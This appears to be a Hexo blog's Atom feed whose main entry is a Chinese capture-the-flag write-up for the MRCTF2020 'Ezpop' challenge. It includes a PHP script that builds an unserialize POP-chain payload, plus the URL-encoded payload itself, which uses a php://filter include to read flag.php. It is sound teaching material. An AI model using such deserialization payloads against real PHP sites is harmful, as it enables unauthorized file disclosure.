<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>小巷幽梦</title>
  
  <subtitle>博客</subtitle>
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2022-04-05T08:41:53.844Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>小巷幽梦</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>佐助</title>
    <link href="http://example.com/2022/04/04/%E4%BD%90%E5%8A%A9/"/>
    <id>http://example.com/2022/04/04/%E4%BD%90%E5%8A%A9/</id>
    <published>2022-04-04T11:24:28.103Z</published>
    <updated>2022-04-05T08:41:53.844Z</updated>
    
    
    
    
    <category term="zzy" scheme="http://example.com/categories/zzy/"/>
    
    
    <category term="佐助" scheme="http://example.com/tags/%E4%BD%90%E5%8A%A9/"/>
    
  </entry>
  
  <entry>
    <title>[MRCTF2020]Ezpop</title>
    <link href="http://example.com/2022/04/04/[MRCTF2020]Ezpop/"/>
    <id>http://example.com/2022/04/04/[MRCTF2020]Ezpop/</id>
    <published>2022-04-04T08:03:01.303Z</published>
    <updated>2022-04-05T08:41:08.717Z</updated>
    
    <content type="html"><![CDATA[<h2 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h2><h3 id="打开题目"><a href="#打开题目" class="headerlink" title="打开题目"></a>打开题目</h3><img src="https://bu.dusays.com/2022/04/04/3c8f6116d3fea.png" alt="img" style="zoom: 25%;" /><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">@unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$a</span>=new Show;</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一眼望去全是类，反序列化没得跑</p><h3 id="审计代码"><a href="#审计代码" class="headerlink" title="审计代码"></a>审计代码</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">@unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$a</span>=new Show;</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不出所料，unserialize，pop链<br>有unserialize，直接找wakeup魔法方法</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">class Show&#123;</span><br><span class="line">public <span class="variable">$source</span>;</span><br><span class="line">public <span class="variable">$str</span>;</span><br><span class="line">public <span class="keyword">function</span> __construct(<span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span>)&#123;</span><br><span class="line"><span class="variable">$this</span>-&gt;<span class="built_in">source</span> = <span class="variable">$file</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;Welcome to &#x27;</span>.<span class="variable">$this</span>-&gt;<span class="built_in">source</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">public <span class="keyword">function</span> <span class="function"><span class="title">__toString</span></span>()&#123;</span><br><span class="line"><span class="built_in">return</span> <span class="variable">$this</span>-&gt;str-&gt;<span class="built_in">source</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public <span class="keyword">function</span> <span class="function"><span class="title">__wakeup</span></span>()&#123;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="variable">$this</span>-&gt;<span class="built_in">source</span>)) &#123;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line"><span class="variable">$this</span>-&gt;<span class="built_in">source</span> = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>wakeup魔法方法进行了过滤，..&#x2F;和一些协议不能用d<br>暂时想到filter读取，先往下看        &#x2F;&#x2F;***<br>wakeup触发后是一个正则匹配好像没什么用，看看同类的其他方法和属性</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public <span class="keyword">function</span> <span class="function"><span class="title">__toString</span></span>()&#123;</span><br><span class="line"><span class="built_in">return</span> <span class="variable">$this</span>-&gt;str-&gt;<span class="built_in">source</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>tostring映入眼帘，即将对象当做字符使用时调用<br>然后返回一个属性的属性，暂时不懂<br>整理思路，从头看第一个类</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">class Modifier &#123;</span><br><span class="line">protected  <span class="variable">$var</span>;</span><br><span class="line">public <span class="keyword">function</span> append(<span class="variable">$value</span>)&#123;</span><br><span class="line">include(<span class="variable">$value</span>);</span><br><span class="line">&#125;</span><br><span class="line">public <span class="keyword">function</span> <span class="function"><span class="title">__invoke</span></span>()&#123;</span><br><span class="line"><span class="variable">$this</span>-&gt;append(<span class="variable">$this</span>-&gt;var);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>文件包含读取源码，这我熟啊，再加上题目上的提示（flag is in flag.php），构造var&#x3D;’php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php’;<br>现在考虑怎么执行这个append方法，下面正好有个__invoke()魔法方法<br>即当对象被当做函数使用时执行这个方法<br>那怎么样将这个类当做函数使用呢，先放着            &#x2F;&#x2F;***<br>看最后一个类</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">class Test&#123;</span><br><span class="line">public <span class="variable">$p</span>;</span><br><span class="line">public <span class="keyword">function</span> <span class="function"><span class="title">__construct</span></span>()&#123;</span><br><span class="line"><span class="variable">$this</span>-&gt;p = array();</span><br><span class="line">&#125;</span><br><span class="line">public <span class="keyword">function</span> __get(<span class="variable">$key</span>)&#123;</span><br><span class="line"><span class="variable">$function</span> = <span class="variable">$this</span>-&gt;p;</span><br><span class="line"><span class="built_in">return</span> <span class="variable">$function</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>__get()魔法方法：在对象外访问私有属性时调用<br>也就是访问一个类中不存在而另一个类存在的属性即可</p><p>类看完了，开始逆推<br>执行append($var) -&gt; 调用魔法方法__invoke() -&gt; 将Modifier当做函数使用 -&gt;<br>在Test类触发__get() -&gt; 在Test类中访问一个只存在于其他类的变量，即source -&gt;<br>如何调用Test类，想到可控变量str，即toString方法的return $this-&gt;str-&gt;source; -&gt;<br>如何调用Tostring，当对象被当做字符串处理时,即this-&gt;source为show类的实例对象-&gt;<br>将str实例化为Test对象<br>整理，也就是：<br>$flag &#x3D; new Show();<br>$flag -&gt; str &#x3D; new Test();<br>$flag -&gt; str -&gt; p &#x3D; new Modifier();<br>$flag_1 &#x3D; new Show($flag);<br>源码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Modifier &#123;</span><br><span class="line">    protected  <span class="variable">$var</span> = <span class="string">&#x27;php://filter/read=convert.base64-encode/resource=flag.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Show&#123;</span><br><span class="line">    public <span class="variable">$source</span>;</span><br><span class="line">    public <span class="variable">$str</span>;</span><br><span class="line">    public <span class="keyword">function</span> __construct(<span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span>)&#123;</span><br><span class="line">        <span class="variable">$this</span>-&gt;<span class="built_in">source</span> = <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">__toString</span></span>()&#123;</span><br><span class="line">        <span class="built_in">return</span> <span class="string">&#x27;kkk&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">class Test&#123;</span><br><span class="line">    public <span class="variable">$p</span>;       </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span> = new Show();</span><br><span class="line"><span class="variable">$flag</span>-&gt;str= new Test();</span><br><span class="line"><span class="variable">$flag</span>-&gt;str-&gt;p = new Modifier();</span><br><span class="line"><span class="variable">$flag_1</span>= new Show(<span class="variable">$flag</span>);</span><br><span class="line"><span class="built_in">echo</span> urlencode(serialize(<span class="variable">$flag_1</span>));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>结果：<br>O%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BO%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3Bs%3A3%3A%22aaa%22%3Bs%3A3%3A%22str%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A1%3A%22p%22%3BO%3A8%3A%22Modifier%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00var%22%3Bs%3A57%3A%22php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3Dflag.php%22%3B%7D%7D%7Ds%3A3%3A%22str%22%3BN%3B%7D</p><p>payload:<br>pop&#x3D;O%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BO%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3Bs%3A3%3A%22aaa%22%3Bs%3A3%3A%22str%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A1%3A%22p%22%3BO%3A8%3A%22Modifier%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00var%22%3Bs%3A57%3A%22php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3Dflag.php%22%3B%7D%7D%7Ds%3A3%3A%22str%22%3BN%3B%7D    </p><p>得到PD9waHAKY2xhc3MgRmxhZ3sKICAgIHByaXZhdGUgJGZsYWc9ICJmbGFnezU0ZjY2MWVjLTZhM2EtNDlkMS04YzVhLWJlNjU2ZWFmYzk2NX0iOwp9CmVjaG8gIkhlbHAgTWUgRmluZCBGTEFHISI7Cj8<br>这么多大写，先试试base64</p><img src="https://bu.dusays.com/2022/04/04/3c8f6116d3fea.png" alt="img" style="zoom:33%;" />]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;WP&quot;&gt;&lt;a href=&quot;#WP&quot; class=&quot;headerlink&quot; title=&quot;WP&quot;&gt;&lt;/a&gt;WP&lt;/h2&gt;&lt;h3 id=&quot;打开题目&quot;&gt;&lt;a href=&quot;#打开题目&quot; class=&quot;headerlink&quot; title=&quot;打开题目&quot;&gt;&lt;/a&gt;打开题目&lt;/h</summary>
      
    
    
    
    <category term="wp" scheme="http://example.com/categories/wp/"/>
    
    
    <category term="[MRCTF2020]Ezpop" scheme="http://example.com/tags/MRCTF2020-Ezpop/"/>
    
  </entry>
  
</feed>
